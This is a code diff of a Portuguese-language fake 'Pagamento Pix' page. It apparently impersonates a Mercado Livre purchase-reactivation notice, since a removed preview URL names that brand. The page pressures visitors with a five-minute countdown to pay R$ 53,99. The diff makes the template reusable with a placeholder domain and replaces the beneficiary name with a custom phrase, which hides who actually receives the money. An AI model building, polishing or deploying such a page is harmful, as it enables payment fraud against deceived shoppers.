@@ -7,13 +7,18 @@
 
   <title>Pagamento Pix</title>
 
-  <!-- PRÉVIA DO WHATSAPP: ALTERE SEU DOMÍNIO -->
+  <!-- PRÉVIA DO WHATSAPP -->
+  <!-- SUBSTITUA SEU-DOMINIO.com PELO SEU DOMÍNIO -->
+
   <meta property="og:type" content="website">
   <meta property="og:title" content="Pagamento Pix">
   <meta property="og:description" content="Consulte as informações do seu pagamento Pix.">
-  <meta property="og:image" content="https://mercado-livre-reativacao-de-compras.onrender.com/logo.png">
-  <meta property="og:url" content="https://mercado-livre-reativacao-de-compras.onrender.com/">
+  <meta property="og:image" content="https://SEU-DOMINIO.com/logo.png">
+  <meta property="og:url" content="https://SEU-DOMINIO.com/">
   <meta name="twitter:card" content="summary_large_image">
+
+  <!-- CONFIGURAÇÕES SEPARADAS -->
+  <script src="config.js" defer></script>
 
   <style>
     * {
@@ -23,17 +28,18 @@
     html, body {
       margin: 0;
       padding: 0;
-      font-family: Arial, Helvetica, sans-serif;
       background: #f5f5f5;
       color: #222;
+      font-family: Arial, Helvetica, sans-serif;
     }
 
     /* TELA DE ABERTURA */
+
     #loading {
       position: fixed;
       inset: 0;
       z-index: 9999;
-      background: white;
+      background: #fff;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -59,10 +65,13 @@
     }
 
     @keyframes spin {
-      to { transform: rotate(360deg); }
+      to {
+        transform: rotate(360deg);
+      }
     }
 
     /* PÁGINA */
+
     #payment {
       display: none;
       min-height: 100vh;
@@ -75,6 +84,7 @@
     }
 
     .container {
+      width: 100%;
       max-width: 600px;
       margin: auto;
       padding: 0 12px 25px;
@@ -86,6 +96,8 @@
       box-shadow: 0 2px 6px rgba(0,0,0,.08);
       margin-top: 44px;
     }
+
+    /* CABEÇALHO */
 
     .intro {
       text-align: center;
@@ -120,12 +132,12 @@
       line-height: 1.25;
     }
 
-    /* FAIXA AMARELA COM CRONÔMETRO */
+    /* FAIXA AMARELA */
+
     .yellow {
       background: #ffdf00;
       padding: 11px 7px;
       text-align: center;
-      color: #222;
       font-size: 13px;
       font-weight: bold;
     }
@@ -148,6 +160,7 @@
     }
 
     /* INSTRUÇÕES */
+
     .instructions {
       padding: 0 18px 18px;
     }
@@ -169,14 +182,19 @@
       margin: 10px 0;
     }
 
+    /* FRASE PERSONALIZADA */
+
     .recipient {
       background: #f3f3f3;
       padding: 12px;
       border-radius: 8px;
       margin-top: 12px;
       font-size: 13px;
+      line-height: 1.5;
       overflow-wrap: anywhere;
     }
+
+    /* CÓDIGO PIX */
 
     .code-area {
       border: 1px solid #ddd;
@@ -204,9 +222,11 @@
       border: none;
       background: transparent;
       color: #4783c7;
-      cursor: pointer;
       font-size: 14px;
+      cursor: pointer;
     }
+
+    /* AVISO */
 
     .notice {
       margin-top: 14px;
@@ -234,6 +254,8 @@
       font-weight: bold;
     }
 
+    /* BOTÃO */
+
     .main-button {
       width: 100%;
       height: 52px;
@@ -259,22 +281,31 @@
     }
 
     @media (max-width: 350px) {
-      h1 { font-size: 21px; }
-      .yellow { font-size: 12px; }
-      .timer { font-size: 14px; }
-      .instructions h2 { font-size: 19px; }
+      h1 {
+        font-size: 21px;
+      }
+
+      .yellow {
+        font-size: 12px;
+      }
+
+      .timer {
+        font-size: 14px;
+      }
+
+      .instructions h2 {
+        font-size: 19px;
+      }
     }
   </style>
-
-  <!-- ARQUIVOS SEPARADOS -->
-  <script src="valor.js" defer></script>
-  <script src="pix.js" defer></script>
 </head>
 
 <body>
 
-  <!-- ABERTURA -->
+  <!-- TELA DE ABERTURA -->
+
   <div id="loading">
+
     <div id="logoScreen">
       <img src="logo.png" alt="Logo">
     </div>
@@ -282,172 +313,288 @@
     <div id="spinnerScreen">
       <div class="spinner"></div>
     </div>
+
   </div>
 
-  <!-- PAGAMENTO -->
+  <!-- PÁGINA DE PAGAMENTO -->
+
   <div id="payment">
 
     <div class="top"></div>
 
     <div class="container">
+
       <div class="card">
 
         <div class="intro">
+
           <div class="logo-icon">R$</div>
-          <div class="small">Falta só um passo!</div>
+
+          <div class="small">
+            Falta só um passo!
+          </div>
 
           <h1>
             Pague <span id="amount"></span>
             via Pix para garantir sua compra
           </h1>
+
         </div>
 
         <!-- FAIXA AMARELA -->
+
         <div class="yellow">
+
           <div class="yellow-content">
-            <span>Confira os dados antes de pagar</span>
+
+            <span>
+              Confira os dados antes de pagar
+            </span>
+
             <span class="timer">
               ⏱️ <span id="timer">05:00</span>
             </span>
+
           </div>
+
         </div>
+
+        <!-- INSTRUÇÕES -->
 
         <div class="instructions">
 
           <h2>Instruções de pagamento</h2>
 
           <div class="steps">
-            <p>1. Acesse seu Internet Banking ou app de pagamentos.</p>
-            <p>2. Escolha pagar via Pix.</p>
-            <p>3. Cole o código abaixo.</p>
+
+            <p>
+              1. Acesse seu Internet Banking
+              ou app de pagamentos.
+            </p>
+
+            <p>
+              2. Escolha pagar via Pix.
+            </p>
+
+            <p>
+              3. Cole o código abaixo.
+            </p>
+
           </div>
+
+          <!-- FRASE NO LUGAR DO BENEFICIÁRIO -->
 
           <div class="recipient">
-            <strong>Beneficiário:</strong>
-            <span id="beneficiary"></span>
+
+            <span id="mensagemPagamento"></span>
+
           </div>
+
+          <!-- CÓDIGO PIX -->
 
           <div class="code-area">
+
             <div id="pixDisplay"></div>
-            <button class="copy-small" onclick="copyPix()">
+
+            <button
+              class="copy-small"
+              onclick="copyPix()"
+            >
               Copiar
             </button>
+
           </div>
+
+          <!-- AVISO -->
 
           <div class="notice">
+
             <div class="info">i</div>
+
             <div>
-              Confira o nome do beneficiário e o valor
-              antes de confirmar o pagamento.
+              Confira o nome do beneficiário
+              e o valor antes de confirmar
+              o pagamento.
             </div>
+
           </div>
 
-          <button class="main-button" onclick="copyPix()">
+          <!-- BOTÃO PRINCIPAL -->
+
+          <button
+            class="main-button"
+            onclick="copyPix()"
+          >
             Copiar código
           </button>
 
           <p id="feedback" role="status" aria-live="polite"></p>
 
         </div>
+
       </div>
+
     </div>
+
   </div>
 
   <script>
-    /* CARREGAR DADOS DOS ARQUIVOS SEPARADOS */
-    document.addEventListener("DOMContentLoaded", function() {
-      const valor = window.PAGAMENTO_VALOR || "53,99";
-      const beneficiario =
-        window.PAGAMENTO_BENEFICIARIO || "NÃO CONFIGURADO";
-      const pix = window.PAGAMENTO_PIX || "";
 
-      document.getElementById("amount").textContent =
-        "R$ " + valor;
+    /* CARREGAR CONFIGURAÇÕES */
 
-      document.getElementById("beneficiary").textContent =
-        beneficiario;
+    document.addEventListener(
+      "DOMContentLoaded",
+      function() {
 
-      document.getElementById("pixDisplay").textContent =
-        pix.length > 48 ? pix.substring(0, 48) + "..." : pix;
+        const valor =
+          window.PAGAMENTO_VALOR || "53,99";
 
-      /* TELA DE ABERTURA */
-      setTimeout(function() {
-        document.getElementById("logoScreen").style.display =
-          "none";
+        const mensagem =
+          window.PAGAMENTO_MENSAGEM || "";
 
-        document.getElementById("spinnerScreen").style.display =
-          "block";
+        const pix =
+          window.PAGAMENTO_PIX || "";
+
+        document.getElementById(
+          "amount"
+        ).textContent = "R$ " + valor;
+
+        document.getElementById(
+          "mensagemPagamento"
+        ).textContent = mensagem;
+
+        document.getElementById(
+          "pixDisplay"
+        ).textContent =
+          pix.length > 48
+            ? pix.substring(0, 48) + "..."
+            : pix;
+
+        /* TELA DE ABERTURA */
 
         setTimeout(function() {
-          document.getElementById("loading").style.display =
-            "none";
 
-          document.getElementById("payment").style.display =
-            "block";
-        }, 850);
-      }, 1500);
+          document.getElementById(
+            "logoScreen"
+          ).style.display = "none";
 
-      /* CRONÔMETRO DE 5 MINUTOS */
-      const duracao = 5 * 60 * 1000;
-      const inicio = Date.now();
-      const timer = document.getElementById("timer");
+          document.getElementById(
+            "spinnerScreen"
+          ).style.display = "block";
 
-      function atualizarTimer() {
-        const restante = Math.max(
-          0,
-          Math.ceil((duracao - (Date.now() - inicio)) / 1000)
-        );
+          setTimeout(function() {
 
-        const minutos = Math.floor(restante / 60);
-        const segundos = restante % 60;
+            document.getElementById(
+              "loading"
+            ).style.display = "none";
 
-        timer.textContent =
-          String(minutos).padStart(2, "0") + ":" +
-          String(segundos).padStart(2, "0");
+            document.getElementById(
+              "payment"
+            ).style.display = "block";
 
-        if (restante === 0) {
-          clearInterval(intervalo);
+          }, 850);
+
+        }, 1500);
+
+        /* CRONÔMETRO DE 5 MINUTOS */
+
+        const duracao = 5 * 60 * 1000;
+        const inicio = Date.now();
+        const timer =
+          document.getElementById("timer");
+
+        function atualizarTimer() {
+
+          const restante = Math.max(
+            0,
+            Math.ceil(
+              (duracao - (Date.now() - inicio)) / 1000
+            )
+          );
+
+          const minutos =
+            Math.floor(restante / 60);
+
+          const segundos =
+            restante % 60;
+
+          timer.textContent =
+            String(minutos).padStart(2, "0")
+            + ":" +
+            String(segundos).padStart(2, "0");
+
+          if (restante === 0) {
+            clearInterval(intervalo);
+          }
+
         }
-      }
 
-      const intervalo = setInterval(atualizarTimer, 250);
-      atualizarTimer();
-    });
+        const intervalo =
+          setInterval(atualizarTimer, 250);
+
+        atualizarTimer();
+
+      }
+    );
 
     /* COPIAR PIX */
-    async function copyPix() {
-      const pix = window.PAGAMENTO_PIX || "";
-      const feedback = document.getElementById("feedback");
 
-      if (!pix.trim() ||
-          pix === "COLE_SEU_CODIGO_PIX_AQUI") {
+    async function copyPix() {
+
+      const pix =
+        window.PAGAMENTO_PIX || "";
+
+      const feedback =
+        document.getElementById("feedback");
+
+      if (
+        !pix.trim() ||
+        pix === "COLE_SEU_CODIGO_PIX_AQUI"
+      ) {
+
         feedback.textContent =
           "O código Pix ainda não foi configurado.";
+
         return;
       }
 
       try {
+
         await navigator.clipboard.writeText(pix);
+
       } catch (error) {
-        const area = document.createElement("textarea");
+
+        const area =
+          document.createElement("textarea");
+
         area.value = pix;
         area.style.position = "fixed";
         area.style.opacity = "0";
+
         document.body.appendChild(area);
+
         area.select();
 
-        const copiado = document.execCommand("copy");
+        const copiado =
+          document.execCommand("copy");
+
         document.body.removeChild(area);
 
         if (!copiado) {
+
           feedback.textContent =
             "Não foi possível copiar o código Pix.";
+
           return;
         }
+
       }
 
-      feedback.textContent = "Código Pix copiado!";
+      feedback.textContent =
+        "Código Pix copiado!";
+
     }
+
   </script>
 
 </body>
